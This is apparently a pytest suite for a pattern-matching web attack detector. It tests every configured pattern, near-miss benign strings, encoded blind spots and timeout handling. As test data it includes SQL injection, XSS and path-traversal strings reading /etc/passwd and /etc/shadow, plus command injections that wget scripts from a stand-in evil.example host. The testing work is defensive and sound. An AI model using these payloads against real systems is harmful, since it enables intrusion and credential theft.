"""Targeted tests for payload pattern matching, per attack category.

The payload engine does case-insensitive *substring* matching of the byte
patterns in ``MALICIOUS_PATTERNS`` (``src/config/config.py``), longest first.
It is not regex-based and it does not URL-decode. These tests document that
behaviour: every configured pattern is checked, each category has positive
cases and benign near-misses, and the known blind spot (encoded payloads) is
recorded as ``xfail(strict=True)`` so that adding decoding forces the test to
be updated.
"""

import time
from urllib.parse import unquote

import pytest

from src.config.config import MALICIOUS_PATTERNS
from src.detection import payload_analyzer
from src.detection.payload_analyzer import detect_malicious_payload, get_payload_statistics


def wrap(pattern: bytes) -> bytes:
    """Embed a pattern in an ordinary-looking HTTP request."""
    return b"GET /search?q=" + pattern + b" HTTP/1.1\r\nHost: example.org\r\n\r\n"


# --- every configured pattern -------------------------------------------------

@pytest.mark.parametrize("pattern", MALICIOUS_PATTERNS, ids=lambda p: p.decode("latin-1"))
def test_every_configured_pattern_is_detected(pattern):
    """If a pattern is edited or broken, detection of it must not silently stop."""
    is_malicious, found = detect_malicious_payload(wrap(pattern))
    assert is_malicious is True
    assert found is not None
    # The reported pattern is the longest one that matches, so it may be a longer
    # pattern containing this one; it must in any case occur in the payload.
    assert found.lower() in wrap(pattern).decode("latin-1").lower()


def test_there_are_no_duplicate_patterns():
    assert len(MALICIOUS_PATTERNS) == len(set(MALICIOUS_PATTERNS))


# --- categories: positives and benign near-misses -----------------------------

CATEGORIES = {
    "sql_injection": {
        "positive": [
            b"1' UNION SELECT user,pass FROM users--",
            b"x'; DROP TABLE users;--",
            b"name=admin'-- &pw=x",
            b"id=1' OR '1'='1'",
            b"; exec xp_cmdshell 'dir'",
        ],
        "benign": [
            b"SELECTion of products is great",
            b"a union of selected items",
            b"drop table of contents",
            b"my password is not 1=1",
        ],
    },
    "command_injection": {
        "positive": [
            b"host=a; wget http://evil.example/x.sh",
            b"ip=1 && wget http://evil.example/x",
            b"cmd=/bin/sh -c 'id'",
            b"x | wget http://evil.example/x",
            b"; chmod 777 /tmp/x",
        ],
        "benign": [
            b"wget is a download tool",
            b"use chmod to change permissions",
            b"this is a bash script",
            b"ncat is a network utility",
        ],
    },
    "xss": {
        "positive": [
            b"<script>alert(1)</script>",
            b"<img src=x onerror=alert(1)>",
            b"<svg onload=alert(1)>",
            b"javascript:alert(document.cookie)",
            b"<iframe src=//evil.example>",
        ],
        "benign": [
            b"<script src='app.js'></script>",
            b"<p>Hello, world</p>",
            b"an alert was raised for the user",
            b"handling the onerror event in JavaScript",
        ],
    },
    "path_traversal": {
        "positive": [
            b"GET /../../../etc/passwd",
            b"..\\..\\..\\windows\\system32",
            b"../../../../etc/shadow",
            b"file:///etc/passwd",
        ],
        "benign": [
            b"../images/logo.png",
            b"../../a/b/c",
            b"etc/passwd is a file",
            b"/etc/hostname",
        ],
    },
    "file_inclusion": {
        "positive": [
            b"page=php://filter/convert.base64-encode/resource=index",
            b"page=php://input",
            b"page=data://text/plain;base64,AAAA",
        ],
        "benign": [
            b"http://example.org/php",
            b"data text plain",
            b"a stream filter in PHP",
        ],
    },
    "php_code": {
        "positive": [
            b"<?php system('id');",
            b"eval(base64_decode('QUJD'))",
            b"c=system($_GET['c'])",
            b"<?php shell_exec('ls');",
        ],
        "benign": [
            b"<?php echo 'hello'; ?>",
            b"eval is evil",
            b"base64 decode helper",
        ],
    },
}

POSITIVES = [(cat, p) for cat, d in CATEGORIES.items() for p in d["positive"]]
BENIGN = [(cat, p) for cat, d in CATEGORIES.items() for p in d["benign"]]


def test_each_category_has_enough_cases():
    for category, cases in CATEGORIES.items():
        assert len(cases["positive"]) >= 3, category
        assert len(cases["benign"]) >= 2, category


@pytest.mark.parametrize("category, payload", POSITIVES, ids=lambda v: v if isinstance(v, str) else v.decode("latin-1")[:40])
def test_attack_is_detected(category, payload):
    is_malicious, found = detect_malicious_payload(payload)
    assert is_malicious is True, f"{category}: {payload!r} not detected"
    assert found is not None


@pytest.mark.parametrize("category, payload", BENIGN, ids=lambda v: v if isinstance(v, str) else v.decode("latin-1")[:40])
def test_benign_near_miss_is_not_flagged(category, payload):
    assert detect_malicious_payload(payload) == (False, None), f"{category}: {payload!r} is a false positive"


# --- case-insensitivity -------------------------------------------------------

@pytest.mark.parametrize("category, payload", POSITIVES, ids=lambda v: v if isinstance(v, str) else v.decode("latin-1")[:40])
def test_detection_is_case_insensitive(category, payload):
    for variant in (payload.upper(), payload.lower(), payload.swapcase()):
        assert detect_malicious_payload(variant)[0] is True, f"{category}: {variant!r}"


# --- longest pattern wins -----------------------------------------------------

def test_longest_matching_pattern_is_reported():
    assert detect_malicious_payload(b"1' UNION SELECT a")[1] == "' UNION SELECT"
    assert detect_malicious_payload(b"1 UNION SELECT a")[1] == "UNION SELECT"


# --- encoded payloads: known blind spot ---------------------------------------

ENCODED = [
    b"id=1%27%20UNION%20SELECT%20password",                 # URL-encoded SQL injection
    b"id=1%2527%2520UNION%2520SELECT%2520password",         # double-encoded
    b"f=..%2f..%2f..%2fetc%2fpasswd",                       # URL-encoded traversal
    b"q=%3Cscript%3Ealert(1)%3C/script%3E",                 # URL-encoded XSS
]


@pytest.mark.xfail(strict=True, reason="payload analysis does not URL-decode; remove this xfail if decoding is added")
@pytest.mark.parametrize("payload", ENCODED, ids=lambda p: p.decode()[:30])
def test_encoded_attack_is_detected(payload):
    assert detect_malicious_payload(payload)[0] is True


@pytest.mark.parametrize("payload", ENCODED[:1] + ENCODED[2:], ids=lambda p: p.decode()[:30])
def test_decoding_before_analysis_would_catch_them(payload):
    """Documents the fix path: once decoded, the same payloads are detected."""
    assert detect_malicious_payload(unquote(payload.decode())[:].encode())[0] is True


# --- documented gaps in the pattern list (current behaviour) ------------------

@pytest.mark.parametrize("payload", [
    b"; ls -la",
    b"| cat /etc/passwd",
    b"`id`",
    b"....//....//etc/hosts",
    b"file.txt\x00.php",
])
def test_payloads_outside_the_pattern_list_are_not_flagged(payload):
    """These look suspicious but match no configured pattern; this pins today's behaviour."""
    assert detect_malicious_payload(payload) == (False, None)


# --- known false positive of substring matching -------------------------------

def test_substring_matching_has_no_word_boundaries():
    """'union select' is found inside 'union selected', so ordinary prose can be flagged.

    This pins today's behaviour. If word-boundary matching is added, flip this test.
    """
    assert detect_malicious_payload(b"The union selected a new leader") == (True, "UNION SELECT")


# --- input handling -----------------------------------------------------------

@pytest.mark.parametrize("bad", [None, "UNION SELECT", 123, bytearray(b"UNION SELECT"), b""])
def test_invalid_input_is_not_flagged(bad):
    assert detect_malicious_payload(bad) == (False, None)


def test_binary_and_non_utf8_payloads_do_not_crash():
    assert detect_malicious_payload(bytes(range(256))) == (False, None)
    assert detect_malicious_payload(b"\xff\xfe UNION SELECT \x80")[0] is True


# --- timeout and error branches -----------------------------------------------

class SlowBytes(bytes):
    def lower(self):
        time.sleep(0.5)
        return super().lower()


class BrokenBytes(bytes):
    def lower(self):
        raise ValueError("boom")


def test_pattern_matching_timeout_is_reported_as_an_attack(monkeypatch):
    monkeypatch.setattr(payload_analyzer, "_SORTED_PATTERNS", [SlowBytes(b"anything")])
    monkeypatch.setattr(payload_analyzer, "PATTERN_MATCH_TIMEOUT", 0.05)
    assert detect_malicious_payload(b"hello") == (True, "TIMEOUT_ATTACK")


def test_unexpected_error_while_matching_fails_safe(monkeypatch):
    monkeypatch.setattr(payload_analyzer, "_SORTED_PATTERNS", [BrokenBytes(b"anything")])
    assert detect_malicious_payload(b"hello") == (False, None)


# --- statistics ---------------------------------------------------------------

def test_statistics_for_printable_text():
    stats = get_payload_statistics(b"abcd")
    assert stats["size"] == 4
    assert stats["printable_chars"] == 4
    assert stats["printable_ratio"] == 1.0
    assert stats["null_bytes"] == 0
    assert stats["entropy"] == pytest.approx(2.0)


def test_statistics_for_binary_with_null_bytes():
    stats = get_payload_statistics(b"\x00\x00\x01\x02")
    assert stats["null_bytes"] == 2
    assert stats["printable_chars"] == 0
    assert stats["printable_ratio"] == 0.0


@pytest.mark.parametrize("bad", [None, "text", b""])
def test_statistics_reject_invalid_input(bad):
    assert get_payload_statistics(bad) == {}


def test_statistics_survive_an_internal_error(monkeypatch):
    def boom(_):
        raise RuntimeError("boom")
    monkeypatch.setattr(payload_analyzer, "calculate_entropy", boom)
    assert get_payload_statistics(b"abcd") == {}
